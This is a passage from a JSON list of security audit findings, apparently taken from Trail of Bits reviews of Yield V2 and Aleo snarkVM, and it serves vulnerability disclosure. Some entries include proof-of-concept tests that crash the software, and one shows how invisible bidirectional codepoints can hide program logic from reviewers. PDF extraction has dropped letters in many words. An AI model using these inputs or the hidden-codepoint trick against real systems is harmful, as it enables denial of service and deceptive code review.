        "description": "Sensitive information such as Etherscan keys, API keys, and an owner private key used in testing is stored in the process environment. This method of storage could make it easier for an attacker to compromise the keys; compromise of the owner key, for example, could enable an attacker to gain owner privileges and steal funds from the protocol. The following portion of the hardhat.config.js le uses secrets from the process environment: let mnemonic = process.env.MNEMONIC if (!mnemonic) { try { mnemonic = fs.readFileSync(path.resolve(__dirname, '.secret')).toString().trim() } catch(e){} } const accounts = mnemonic ? { mnemonic, }: undefined let etherscanKey = process.env.ETHERSCANKEY if (!etherscanKey) { try { etherscanKey = fs.readFileSync(path.resolve(__dirname, '.etherscanKey')).toString().trim() } catch(e){} } Figure 11.1: vault-v2/hardhat.config.ts#L67-L82 31 Yield V2 Exploit Scenario Alice, a member of the Yield team, has secrets stored in the process environment. Eve, an attacker, gains access to Alices device and extracts the Infura and owner keys from it. Eve then launches a denial-of-service attack against the front end of the system and uses the owner key to steal the funds held by the owner on the mainnet. Recommendations Short term, to prevent attackers from accessing system funds, avoid using hard-coded secrets or storing secrets in the process environment. Long term, use a hardware security module to ensure that keys can never be extracted. 32 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Use of multiple repositories ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Yield Protocol code is spread across four repositories. These repositories are tightly coupled, and the code is broken up somewhat arbitrarily. This makes it more dicult to navigate the codebase and to obtain a complete picture of the code that existed at any one time. It also makes it impossible to associate one version of the protocol with one commit hash. Instead, each version requires four commit hashes. Exploit Scenario The master branch of one repository of the protocol is not compatible with the master branch of another. The contracts incompatibility leads to problems when a new version of the protocol is deployed. Recommendations To maintain one canonical version of the protocol, avoid using multiple repositories for the contracts. 42 Yield V2 A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Consoles Field and Scalar divisions panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The division operation of the Field and Scalar types do not guard against a division by zero. This causes a runtime panic when values from these types are divided by zero. Figure 1.1 shows a test and the respective stack backtrace, where a None option is unconditionally unwrapped in snarkvm/fields/src/fp_256.rs : #[test] fn test_div () { let zero = Field::<CurrentEnvironment>::zero(); // Sample a new field. let num = Field::<CurrentEnvironment>::new(Uniform::rand(& mut test_rng())); // Divide by zero let neg = num.div(zero); } // running 1 test // thread 'arithmetic::tests::test_div' panicked at 'called `Option::unwrap()` on a `None` value', /snarkvm/fields/src/fp_256.rs:709:42 // stack backtrace: // 0: rust_begin_unwind // at /rustc/v/library/std/src/panicking.rs:584:5 // 1: core::panicking::panic_fmt // at /rustc/v/library/core/src/panicking.rs:142:14 // 2: core::panicking::panic // at /rustc/v/library/core/src/panicking.rs:48:5 // 3: core::option::Option<T>::unwrap // at /rustc/v/library/core/src/option.rs:755:21 // 4: <snarkvm_fields::fp_256::Fp256<P> as core::ops::arith::DivAssign<&snarkvm_fields::fp_256::Fp256<P>>>::div_assign // at snarkvm/fields/src/fp_256.rs:709:26 // 5: <snarkvm_fields::fp_256::Fp256<P> as core::ops::arith::Div>::div // at snarkvm/fields/src/macros.rs:524:17 // 6: snarkvm_console_types_field::arithmetic::<impl core::ops::arith::Div for snarkvm_console_types_field::Field<E>>::div // at ./src/arithmetic.rs:143: // 7: snarkvm_console_types_field::arithmetic::tests::test_div // at ./src/arithmetic.rs:305:23 Figure 1.1: Test triggering the division by zero The same issue is present in the Scalar type, which has no zero-check for other : impl <E: Environment > Div<Scalar<E>> for Scalar<E> { type Output = Scalar<E>; /// Returns the `quotient` of `self` and `other`. #[inline] fn div ( self , other: Scalar <E>) -> Self ::Output { Scalar::new( self .scalar / other.scalar) } } Figure 1.2: console/types/scalar/src/arithmetic.rs#L137-L146 Exploit Scenario An attacker sends a zero value which is used in a division, causing a runtime error and the program to halt. Recommendations Short term, add checks to validate that the divisor is non-zero on both the Field and Scalar divisions. Long term, add tests exercising all arithmetic operations with the zero element.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. from_xy_coordinates function lacks checks and can panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "Unlike Group::from_x_coordinate , the Group::from_xy_coordinates function does not enforce the resulting point to be on the elliptic curve or in the correct subgroup. Two dierent behaviors can occur depending on the underlying curve:  For a short Weierstrass curve (gure 2.1), the function will always succeed and not perform any membership checks on the point; this could lead to an invalid point being used in other curve operations, potentially leading to an invalid curve attack. /// Initializes a new affine group element from the given coordinates. fn from_coordinates (coordinates: Self ::Coordinates) -> Self { let (x, y, infinity) = coordinates; Self { x, y, infinity } } Figure 2.1: No curve membership checks present at curves/src/templates/short_weierstrass_jacobian/affine.rs#L103-L107  For a twisted Edwards curve (gure 2.2), the function will panic if the point is not on the curveunlike the from_x_coordinate function, which returns an Option . /// Initializes a new affine group element from the given coordinates. fn from_coordinates (coordinates: Self ::Coordinates) -> Self { let (x, y) = coordinates; let point = Self { x, y }; assert! (point.is_on_curve()); point } Figure 2.2: curves/src/templates/twisted_edwards_extended/affine.rs#L102-L108 Exploit Scenario An attacker is able to construct an invalid point for the short Weierstrass curve, potentially revealing secrets if this point is used in scalar multiplications with secret data. Recommendations Short term, make the output type similar to the from_x_coordinate function, returning an Option . Enforce curve membership on the short Weierstrass implementation and consider returning None instead of panicking when the point is not on the twisted Edwards curve.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Blake2Xs implementation fails to provide the requested number of bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The Blake2Xs implementation returns an empty byte array when the requested number of bytes is between u16::MAX-30 and u16::MAX . The Blake2Xs is an extendible-output hash function (XOF): It receives a parameter called xof_digest_length that determines how many bytes the hash function should return. When computing the necessary number of rounds, there is an integer overow if xof_digest_length is between u16::MAX-30 and u16::MAX . This integer overow causes the number of rounds to be zero and the resulting hash to have zero bytes. fn evaluate (input: & [ u8 ], xof_digest_length : u16 , persona: & [ u8 ]) -> Vec < u8 > { assert! (xof_digest_length > 0 , \"Output digest must be of non-zero length\" ); assert! (persona.len() <= 8 , \"Personalization may be at most 8 characters\" ); // Start by computing the digest of the input bytes. let xof_digest_length_node_offset = (xof_digest_length as u64 ) << 32 ; let input_digest = blake2s_simd::Params::new() .hash_length( 32 ) .node_offset(xof_digest_length_node_offset) .personal(persona) .hash(input); let mut output = vec! []; let num_rounds = ( xof_digest_length + 31 ) / 32 ; for node_offset in 0 ..num_rounds { Figure 3.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The nding is informational because the hash function is used only on the hash_to_curve routine, and never with an attacker-controlled digest length parameter. The currently used value is the size of the generator, which is not expected to reach values similar to u16::MAX . Exploit Scenario The Blake2Xs hash function is used with the maximum number of bytes, u16::MAX , to compare password hashes. Due to the vulnerability, any password will match the correct one since the hash output is always the empty array, allowing an attacker to gain access. Recommendations Short term, upcast the xof_digest_length variable to a larger type before the sum. This will prevent the overow while enforcing the u16::MAX bound on the requested digest length. 4. Blake2Xs implementations node o\u0000set denition di\u0000ers from specication Severity: Informational Diculty: High Type: Cryptography Finding ID: TOB-ALEOA-4 Target: console/algorithms/src/blake2xs/mod.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Compiling cast instructions can lead to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The output_types function of the cast instruction assumes that the number of record or interface elds equals the number of input types. // missing checks for (input_type, (_, entry_type)) in input_types.iter().skip( 2 ). zip_eq(record.entries() ) { Figure 5.1: Invocation of zip_eq on two iterators that dier in length ( cast.rs:401 ) Therefore, compiling a program with an unmatched cast instruction will cause a runtime panic. The program in gure 5.2 casts two registers into an interface type with only one eld: program aleotest.aleo; interface message: amount as u64; function test: input r0 as u64.private; cast r0 r0 into r1 as message; Figure 5.2: Program panics during compilation Figure 5.3 shows a program that will panic when compiling because it casts three registers into a record type with two elds: program aleotest.aleo; record token: owner as address.private; gates as u64.private; function test: input r0 as address.private; input r1 as u64.private; cast r0 r1 r1 into r2 as token.record; Figure 5.3: Program panics during compilation The following stack trace is printed in both cases: <itertools::zip_eq_impl::ZipEq<I,J> as core::iter::traits::iterator::Iterator>::next::h5c767bbe55881ac0 snarkvm_compiler::program::instruction::operation::cast::Cast<N>::output_types::h3d1 251fbb81d620f snarkvm_compiler::process::stack::helpers::insert::<impl snarkvm_compiler::process::stack::Stack<N>>::check_instruction::h6bf69c769d8e877b snarkvm_compiler::process::stack::Stack<N>::new::hb1c375f6e4331132 snarkvm_compiler::process::deploy::<impl snarkvm_compiler::process::Process<N>>::deploy::hd75a28b4fc14e19e snarkvm_fuzz::harness::fuzz_program::h131000d3e1900784 This bug was discovered through fuzzing with LibAFL . Figure 5.4: Stack trace Recommendations Short term, add a check to validate that the number of Cast arguments equals the number of record or interface elds. Long term, review all other uses of zip_eq and check the length of their iterators.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Displaying an Identier can cause a panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The Identifier of a program uses Fields internally. It is possible to construct an Identifier from an arbitrary bits array. However, the implementation of the Display trait of Identifier expects that this arbitrary data is valid UTF-8. Creating an identier from a bytes array already checks whether the bytes are valid UTF-8. The following formatting function tries to create a UTF-8 string regardless of the bits of the eld. fn fmt (& self , f: & mut Formatter) -> fmt :: Result { // Convert the identifier to bits. let bits_le = self . 0. to_bits_le(); // Convert the bits to bytes. let bytes = bits_le .chunks( 8 ) .map(|byte| u8 ::from_bits_le(byte).map_err(|_| fmt::Error)) .collect::< Result < Vec < u8 >, _>>()?; // Parse the bytes as a UTF-8 string. let string = String ::from_utf8(bytes).map_err(|_| fmt::Error)? ; ... } Figure 6.1: Relevant code ( parse.rs:76 ) As a result, constructing an Identifier with invalid UTF-8 bit array will cause a runtime error when the Identifier is displayed. The following test shows how to construct such an Identifier . #[test] fn test_invalid_identifier () { let invalid: & [ u8 ] = &[ 112 , 76 , 113 , 165 , 54 , 175 , 250 , 182 , 196 , 85 , 111 , 26 , 71 , 35 , 81 , 194 , 56 , 50 , 216 , 176 , 126 , 15 ]; let bits: Vec < bool > = invalid.iter().flat_map(|n| [n & ( 1 << 7 ) != 0 , n & ( 1 << 6 ) != 0 , n & ( 1 << 5 ) != 0 , n & ( 1 << 4 ) != 0 , n & ( 1 << 3 ) != 0 , n & ( 1 << 2 ) != 0 , n & ( 1 << 1 ) != 0 , n & ( 1 << 0 ) != 0 ]).collect(); let name = Identifier::from_bits_le(&bits).unwrap(); let network = Identifier::from_str( \"aleo\" ).unwrap(); let id = ProgramID::<CurrentNetwork>::from((name, network)); println!( \"{:?}\" , id.to_string()); } // a Display implementation returned an error unexpectedly: Error // thread 'program::tests::test_invalid_identifier' panicked at 'a Display implementation returned an error unexpectedly: Error', library/core/src/result.rs:1055:23 4: <T as alloc::string::ToString>::to_string at /rustc/dc80ca78b6ec2b6bba02560470347433bcd0bb3c/library/alloc/src/string.rs:2489:9 5: snarkvm_compiler::program::tests::test_invalid_identifier at ./src/program/mod.rs:650:26 Figure 6.2: Test causing a panic The testnet3_add_fuzz_tests branch has a workaround that prevents nding this issue. Using the arbitrary crate, it is likely that non-UTF-8 bit-strings end up in identiers. We suggest xing this bug instead of using the workaround. This bug was discovered through fuzzing with LibAFL. Recommendations Short term, we suggest using a placeholder like unprintable identifier instead of returning a formatting error. Alternatively, a check for UTF-8 could be added in the Identifier::from_bits_le .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Build script causes compilation to rerun ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "Using the current working directory as a rerun condition causes unnecessary recompilations, as any change in cargos target directory will trigger a compilation. // Re-run upon any changes to the workspace. println!( \"cargo:rerun-if-changed=.\" ); Figure 7.1: Rerun condition in build.rs ( build.rs:57 ) The root build script also implements a check that all les include the proper license. However, the check is insucient to catch all cases where developers forget to include a license. Adding a new empty Rust le without modifying any other le will not make the check in the build.rs fail because the check is not re-executed. Recommendations Short term, remove the rerun condition and use the default Cargo behavior . By default cargo reruns the build.rs script if any Rust le in the source tree has changed. Long term, consider using a git commit hook to check for missing licenses at the top of les. An example of such a commit hook can be found here .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Invisible codepoints are supported ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The current parser allows any Unicode character in strings or comments, which can include invisible bidirectional override characters . Using such characters can lead to dierences between the code reviewed in a pull request and the compiled code. Figure 8.1 shows such a program: since r2 and r3 contain the hash of the same string, r4 is true , and r5 equals r1 , the output token has the amount eld set to the second input. However, the compiled program always returns a token with a zero amount . // Program comparing aleo with aleo string program aleotest.aleo; record token: owner as address.private; gates as u64.private; amount as u64.private; function mint: input r0 as address.private; input r1 as u64.private; hash.psd2 \"aleo\" into r2; \" into r3; hash.psd2 \"aleo // Same string again is.eq r2 r3 into r4; // r4 is true because r2 == r3 ternary r4 r1 0u64 into r5; // r5 is r1 because r4 is true cast r0 0u64 r5 into r6 as token.record; output r6 as token.record; Figure 8.1: Aleo program that evaluates unexpectedly By default, VSCode shows the Unicode characters (gure 8.2). Google Docs and GitHub display the source code as in gure 8.1. Figure 8.2: The actual source This nding is inspired by CVE-2021-42574 . Recommendations Short term, reject the following code points: U+202A, U+202B, U+202C, U+202D, U+202E, U+2066, U+2067, U+2068, U+2069. This list might not be exhaustive. Therefore, consider disabling all non-ASCII characters in the Aleo language. In the future, consider introducing escape sequences so users can still use bidirectional code points if there is a legitimate use case.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Merkle tree constructor panics with large leaf array ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The Merkle tree constructor panics or returns a malformed Merkle tree when the provided leaves array has more than usize::MAX/2 elements. To build a Merkle tree, the constructor receives the necessary array of leaves. Being a binary tree, the nal total number of nodes is computed using the smallest power of two above the number of leaves given: pub fn new (leaf_hasher: & LH , path_hasher: & PH , leaves: & [LH::Leaf]) -> Result < Self > { // Ensure the Merkle tree depth is greater than 0. ensure!(DEPTH > 0 , \"Merkle tree depth must be greater than 0\" ); // Ensure the Merkle tree depth is less than or equal to 64. ensure!(DEPTH <= 64 u8 , \"Merkle tree depth must be less than or equal to 64\" ); // Compute the maximum number of leaves. let max_leaves = leaves.len().next_power_of_two() ; // Compute the number of nodes. let num_nodes = max_leaves - 1 ; Figure 9.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The next_power_of_two function will panic in debug mode, and return 0 in release mode if the number is larger than (1 << (N-1)) . For the usize type, on 64-bit machines, the function returns 0 for numbers above 2 63 . On 32-bit machines, the necessary number of leaves would be at least 1+2 31 . Exploit Scenario An attacker triggers a call to the Merkle tree constructor with 1+2 31 leaves, causing the 32-bit machine to abort due to a runtime error or to return a malformed Merkle tree. Recommendations Short term, use checked_next_power_of_two and check for success. Check all other uses of the next_power_of_two for similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Downcast possibly truncates value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "To validate the console's Ciphertext eld vector length against a u32 constant, the program downcasts the length from usize to u32 . This could cause a value truncation and a successful write when an error should occur. Then, the program downcasts the value to a u16 , not checking rst if this is safe without truncation. fn write_le <W: Write >(& self , mut writer: W ) -> IoResult <()> { // Ensure the number of field elements does not exceed the maximum allowed size. if self . 0. len() as u32 > N::MAX_DATA_SIZE_IN_FIELDS { return Err (error( \"Ciphertext is too large to encode in field elements.\" )); } // Write the number of ciphertext field elements. ( self . 0. len() as u16 ).write_le(& mut writer)?; // Write the ciphertext field elements. self . 0. write_le(& mut writer) } } Figure 10.1: console/program/src/data/ciphertext/bytes.rs#L36-L49 Figure 10.2 shows another instance where the value is downcasted to u16 without checking if this is safe: // Ensure the number of field elements does not exceed the maximum allowed size. match num_fields <= N::MAX_DATA_SIZE_IN_FIELDS as usize { // Return the number of field elements. true => Ok ( num_fields as u16 ), Figure 10.2: console/program/src/data/ciphertext/size_in_fields.rs#L21-L30 A similar downcast is present in the Plaintext size_in_fields function . Currently, this downcast causes no issue because the N::MAX_DATA_SIZE_IN_FIELDS constant is less than u16::MAX . However, if this constant were changed, truncating downcasts could occur. Recommendations Short term, upcast N::MAX_DATA_SIZE_IN_FIELDS in Ciphertext::write_le to usize instead of downcasting the vector length, and ensure that the downcasts to u16 are safe.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Plaintext::from_bits_* functions assume array has elements ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The from_bits_le function assumes that the provided array is not empty, immediately indexing the rst and second positions without a length check: /// Initializes a new plaintext from a list of little-endian bits *without* trailing zeros. fn from_bits_le (bits_le: & [ bool ]) -> Result < Self > { let mut counter = 0 ; let variant = [bits_le[counter], bits_le[counter + 1 ]]; counter += 2 ; Figure 11.1: circuit/program/src/data/plaintext/from_bits.rs#L22-L28 A similar pattern is present on the from_bits_be function on both the Circuit and Console implementations of Plaintext . Instead, the function should rst check if the array is empty before accessing elements, or documentation should be added so that the function caller enforces this. Recommendations Short term, check if the array is empty before accessing elements, or add documentation so that the function caller enforces this.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Arbitrarily deep recursion causes stack exhaustion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The codebase has recursive functions that operate on arbitrarily deep structures. This causes a runtime error as the programs stack is exhausted with a very large number of recursive calls. The Plaintext parser allows an arbitrarily deep interface value such as {bar: {bar: {bar: {... bar: true}}} . Since the formatting function is recursive, a suciently deep interface will exhaust the stack on the fmt_internal recursion. We conrmed this nding with a 2880-level nested interface. Parsing the interface with Plaintext::from_str succeeds, but printing the result causes stack exhaustion: #[test] fn test_parse_interface3 () -> Result <()> { let plain = Plaintext::<CurrentNetwork>::from_str( /* too long to display */ )?; println! ( \"Found: {plain}\\n\" ); Ok (()) } // running 1 test // thread 'data::plaintext::parse::tests::test_deep_interface' has overflowed its stack // fatal runtime error: stack overflow // error: test failed, to rerun pass '-p snarkvm-console-program --lib' Figure 12.1: console/algorithms/src/blake2xs/mod.rs#L32-L47 The same issue is present on the record and record entry formatting routines. The Record::find function is also recursive, and a suciently large argument array could also lead to stack exhaustion. However, we did not conrm this with a test. Exploit Scenario An attacker provides a program with a 2880-level deep interface, which causes a runtime error if the result is printed. Recommendations Short term, add a maximum depth to the supported data structures. Alternatively, implement an iterative algorithm for creating the displayed structure.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Inconsistent pair parsing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The codebase has several implementations to parse pairs from strings of the form key: value depending on the expected type of value . However, these parsers also handle whitespaces around the colon dierently. As an example, gure 13.1 shows a parser that allows whitespaces before the colon, while gure 13.2 shows one that does not: fn parse_pair <N: Network >(string: &str ) -> ParserResult <(Identifier<N>, Plaintext<N>)> { // Parse the whitespace and comments from the string. let (string, _) = Sanitizer::parse(string)?; // Parse the identifier from the string. let (string, identifier) = Identifier::parse(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the \":\" from the string. let (string, _) = tag( \":\" )(string)?; // Parse the plaintext from the string. let (string, plaintext) = Plaintext::parse(string)?; Figure 13.1: console/program/src/data/plaintext/parse.rs#L23-L34 fn parse_pair <N: Network >(string: &str ) -> ParserResult <(Identifier<N>, Entry<N, Plaintext<N>>)> { // Parse the whitespace and comments from the string. let (string, _) = Sanitizer::parse(string)?; // Parse the identifier from the string. let (string, identifier) = Identifier::parse(string)?; // Parse the \":\" from the string. let (string, _) = tag( \":\" )(string)?; // Parse the entry from the string. let (string, entry) = Entry::parse(string)?; Figure 13.2: console/program/src/data/record/parse_plaintext.rs#L23-L33 We also found that whitespaces before the comma symbol are not allowed: let (string, owner) = alt(( map(pair( Address::parse, tag( \".public\" ) ), |(owner, _)| Owner::Public(owner)), map(pair( Address::parse, tag( \".private\" ) ), |(owner, _)| { Owner::Private(Plaintext::from(Literal::Address(owner))) }), ))(string)?; // Parse the \",\" from the string. let (string, _) = tag( \",\" )(string)?; Figure 13.3: console/program/src/data/record/parse_plaintext.rs#L52-L60 Recommendations Short term, handle whitespace around marker tags (such as colon, commas, and brackets) uniformly. Consider implementing a generic pair parser that receives the expected value type parser instead of reimplementing it for each type. 14. Signature veries with di\u0000erent messages Severity: Informational Diculty: Low Type: Cryptography Finding ID: TOB-ALEOA-14 Target: console/account/src/signature/verify.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Unchecked output length during ToFields conversion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "When converting dierent types to vectors of Field elements, the codebase has checks to validate that the resulting Field vector has fewer than MAX_DATA_SIZE_IN_FIELDS elements. However, the StringType::to_fields function is missing this validation: impl <E: Environment > ToFields for StringType<E> { type Field = Field<E>; /// Casts a string into a list of base fields. fn to_fields (& self ) -> Vec < Self ::Field> { // Convert the string bytes into bits, then chunk them into lists of size // `E::BaseField::size_in_data_bits()` and recover the base field element for each chunk. // (For advanced users: Chunk into CAPACITY bits and create a linear combination per chunk.) self .to_bits_le().chunks(E::BaseField::size_in_data_bits()).map(Field::from_bits_le) .collect() } } Figure 15.1: circuit/types/string/src/helpers/to_fields.rs#L20-L30 We also remark that other conversion functions, such as from_bits and to_bits , do not constraint the input or output length. Recommendations Short term, add checks to validate the Field vector length for the StringType::to_fields function. Determine if other output functions (e.g., to_bits ) should also enforce length constraints.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Potential panic on ensure_console_and_circuit_registers_match ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The codebase implements the ensure_console_and_circuit_registers_match function, which validates that the values on the console and circuit registers match. The function uses zip_eq to iterate over the two register arrays, but does not check if these arrays have the same length, leading to a runtime error when they do not. pub fn ensure_console_and_circuit_registers_match (& self ) -> Result <()> { use circuit::Eject; for ((console_index, console_register), (circuit_index, circuit_register)) in self .console_registers.iter(). zip_eq (& self .circuit_registers) Figure 16.1: vm/compiler/src/process/registers/mod.rs This runtime error is currently not reachable since the ensure_console_and_circuit_registers_match function is called only in CallStack::Execute mode, and the number of stored registers match in this case: // Store the inputs. function.inputs().iter().map(|i| i.register()).zip_eq(request.inputs()).try_for_each(|(register, input)| { // If the circuit is in execute mode, then store the console input. if let CallStack::Execute(..) = registers.call_stack() { // Assign the console input to the register. registers.store( self , register, input.eject_value())?; } // Assign the circuit input to the register. registers.store_circuit( self , register, input.clone()) })?; Figure 16.2: vm/compiler/src/process/stack/execute.rs Recommendations Short term, add a check to validate that the number of circuit and console registers match on the ensure_console_and_circuit_registers_match function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Reserved keyword list is missing owner ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The compiler veries that identiers are not part of a list of reserved keywords. However, the list of keywords is missing the owner keyword. This contrasts with the other record eld, gates , which is a reserved keyword. // Record \"record\" , \"gates\" , // Program Figure 17.1: vm/compiler/src/program/mod.rs Recommendations Short term, add owner to the list of reserved keywords.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Commit and hash instructions not matched against the opcode in check_instruction_opcode ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The check_instruction_opcode function validates that the opcode and instructions match for the Literal , Call , and Cast opcodes, but not for the Commit and Hash opcodes. Although there is partial code for this validation, it is commented out: Opcode::Commit(opcode) => { // Ensure the instruction belongs to the defined set. if ![ \"commit.bhp256\" , \"commit.bhp512\" , \"commit.bhp768\" , \"commit.bhp1024\" , \"commit.ped64\" , \"commit.ped128\" , ] .contains(&opcode) { bail!( \"Instruction '{instruction}' is not the opcode '{opcode}'.\" ); } // Ensure the instruction is the correct one. // match opcode { // \"commit.bhp256\" => ensure!( // matches!(instruction, Instruction::CommitBHP256(..)), // \"Instruction '{instruction}' is not the opcode '{opcode}'.\" // ), // } } Opcode::Hash(opcode) => { // Ensure the instruction belongs to the defined set. if ![ \"hash.bhp256\" , \"hash.bhp512\" , \"hash.bhp768\" , \"hash.bhp1024\" , \"hash.ped64\" , \"hash.ped128\" , \"hash.psd2\" , \"hash.psd4\" , \"hash.psd8\" , ] .contains(&opcode) { bail!( \"Instruction '{instruction}' is not the opcode '{opcode}'.\" ); } // Ensure the instruction is the correct one. // match opcode { // \"hash.bhp256\" => ensure!( // matches!(instruction, Instruction::HashBHP256(..)), // \"Instruction '{instruction}' is not the opcode '{opcode}'.\" // ), // } } Figure 18.1: vm/compiler/src/process/stack/helpers/insert.rs Recommendations Short term, add checks to validate that the opcode and instructions match for the Commit and Hash opcodes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Incorrect validation of the number of operands ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "The implementation of Literals::fmt and Literals::write_le do not correctly validate the number of operands in the operation. Instead of enforcing the exact number of arguments, the implementations only ensure that the number of operands is less than or equal to the expected number of operands: /// Writes the operation to a buffer. fn write_le <W: Write >(& self , mut writer: W ) -> IoResult <()> { // Ensure the number of operands is within the bounds. if NUM_OPERANDS > N::MAX_OPERANDS { return Err (error( format! ( \"The number of operands must be <= {}\" , N::MAX_OPERANDS))); } // Ensure the number of operands is correct. if self .operands.len() > NUM_OPERANDS { return Err (error( format! ( \"The number of operands must be {}\" , NUM_OPERANDS))); } Figure 19.1: vm/compiler/src/program/instruction/operation/literals.rs#L294-L303 Recommendations Short term, replace the if statement guard with self.operands.len() != NUM_OPERANDS in both the Literals::fmt and Literals::write_le functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Inconsistent and random compiler error message ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "description": "When the compiler nds a type mismatch between arguments and expected parameters, it emits an error message containing a dierent integer each time the code is compiled. Figure 20.1 shows an Aleo program that, when compiled twice, shows two dierent error messages (shown in gure 20.2). The error message also states that u8 is invalid, but at the same time expecting u8 . program main.aleo; closure clo: input r0 as i8; input r1 as u8; pow r0 r1 into r2; output r2 as i8; function compute: input r0 as i8.private; input r1 as i8.public; call clo r0 r1 into r2; // r1 is i8 but the closure requires u8 output r2 as i8.private; Figure 20.1: Aleo program ~/Documents/aleo/foo (testnet3?) $ aleo build  Compiling 'main.aleo'...  Loaded universal setup (in 1537 ms)  'u8' is invalid : expected u8, found 124i8 ~/Documents/aleo/foo (testnet3?) $ aleo build  Compiling 'main.aleo'...  Loaded universal setup (in 1487 ms)  'u8' is invalid : expected u8, found -39i8 Figure 20.2: Two compilation results Figure 20.3 shows the check that validates that the types match and shows the error message containing the actual literal instead of literal.to_type() : Plaintext::Literal(literal, ..) => { // Ensure the literal type matches. match literal.to_type() == *literal_type { true => Ok (()), false => bail!( \"'{ plaintext_type }' is invalid: expected {literal_type}, found { literal }\" ), Figure 20.3: vm/compiler/src/process/stack/helpers/matches.rs#L204-L209 Recommendations Short term, clarify the error message by rephrasing it and presenting only the literal type instead of the full literal.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Instruction add_* methods incorrectly compare maximum number of allowed instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
